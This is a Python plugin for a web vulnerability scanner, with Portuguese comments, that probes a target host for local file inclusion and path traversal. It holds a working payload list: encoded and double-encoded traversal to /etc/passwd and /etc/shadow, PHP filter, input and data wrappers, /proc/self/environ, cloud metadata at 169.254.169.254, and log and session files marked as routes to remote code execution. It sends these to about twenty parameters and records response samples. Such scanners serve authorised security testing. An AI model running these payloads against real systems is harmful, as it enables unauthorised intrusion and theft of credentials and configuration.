# plugins/lfi_scanner.py
def run(target, ip, open_ports, banners):
    """
    Scanner LFI (Local File Inclusion) / Path Traversal.
    2026 Intel: PHP wrappers, double encoding, null byte, path truncation,
    log poisoning vectors, session file hijack, cloud metadata via LFI.
    """
    import requests

    params = ["file", "page", "path", "include", "template", "doc", "folder", "view",
              "content", "cat", "dir", "action", "board", "date", "detail", "download",
              "module", "controller", "func", "load"]
    payloads = [
        # Clássicos
        ("../../../etc/passwd", "root:", "TRAVERSAL"),
        ("..\\..\\..\\etc\\passwd", "root:", "BACKSLASH"),
        # Filter bypass
        ("....//....//....//etc/passwd", "root:", "DOUBLE_DOT_BYPASS"),
        ("..%2f..%2f..%2fetc%2fpasswd", "root:", "URL_ENCODE"),
        ("%252e%252e%252f%252e%252e%252fetc%252fpasswd", "root:", "DOUBLE_ENCODE"),
        ("..%c0%af..%c0%afetc/passwd", "root:", "UNICODE_OVERLONG"),
        # Null byte (PHP < 5.3)
        ("../../../etc/passwd%00", "root:", "NULL_BYTE"),
        # Windows
        ("..\\..\\..\\windows\\win.ini", "[fonts]", "WIN_INI"),
        ("..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", "localhost", "WIN_HOSTS"),
        # PHP wrappers (2026 focus)
        ("php://filter/convert.base64-encode/resource=index.php", "PD9w", "PHP_FILTER"),
        ("php://filter/convert.base64-encode/resource=config.php", "PD9w", "PHP_FILTER_CONFIG"),
        ("php://input", "", "PHP_INPUT"),
        ("data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==", "phpinfo", "DATA_WRAPPER"),
        # /proc filesystem
        ("....//....//....//proc/self/environ", "PATH=", "PROC_ENVIRON"),
        ("....//....//....//proc/self/cmdline", "", "PROC_CMDLINE"),
        ("....//....//....//proc/self/fd/0", "", "PROC_FD"),
        # Cloud metadata via LFI
        ("http://169.254.169.254/latest/meta-data/", "ami-id", "AWS_METADATA_LFI"),
        # Logs (LFI to RCE via log poisoning)
        ("../../../var/log/apache2/access.log", "GET", "APACHE_LOG"),
        ("../../../var/log/nginx/access.log", "GET", "NGINX_LOG"),
        ("../../../var/log/auth.log", "sshd", "AUTH_LOG"),
        # Session files
        ("../../../var/lib/php/sessions/sess_", "", "PHP_SESSION"),
        ("../../../tmp/sess_", "", "PHP_SESSION_TMP"),
        # Shadow file
        ("../../../etc/shadow", "root:", "SHADOW_FILE"),
        # Sensitive configs
        ("../../../etc/mysql/my.cnf", "mysqld", "MYSQL_CONFIG"),
        ("../../../etc/ssh/sshd_config", "Port", "SSH_CONFIG"),
    ]
    vulns = []

    for param in params:
        for payload, indicator, method in payloads:
            url = f"http://{target}/?{param}={payload}"
            try:
                resp = requests.get(url, timeout=6)
                if resp.status_code == 200 and indicator and indicator in resp.text:
                    sev = "CRITICO"
                    if method in ["PHP_FILTER", "PHP_FILTER_CONFIG", "PHP_INPUT", "DATA_WRAPPER"]:
                        desc = "PHP wrapper exploitation — possível RCE!"
                    elif method == "AWS_METADATA_LFI":
                        desc = "LFI → Cloud metadata access!"
                    elif "LOG" in method:
                        desc = "Log file incluso — chain com log poisoning para RCE!"
                    elif method == "SHADOW_FILE":
                        desc = "Shadow file exposto — credential theft!"
                    else:
                        desc = f"LFI confirmado via {method}"

                    vulns.append({
                        "tipo": "LFI",
                        "parametro": param,
                        "payload": payload[:60],
                        "metodo": method,
                        "severidade": sev,
                        "descricao": desc,
                        "amostra": resp.text[:200],
                    })
                    break
            except Exception:
                continue

    return {"plugin": "lfi_scanner", "resultados": vulns if vulns else "Nenhum LFI detectado"}
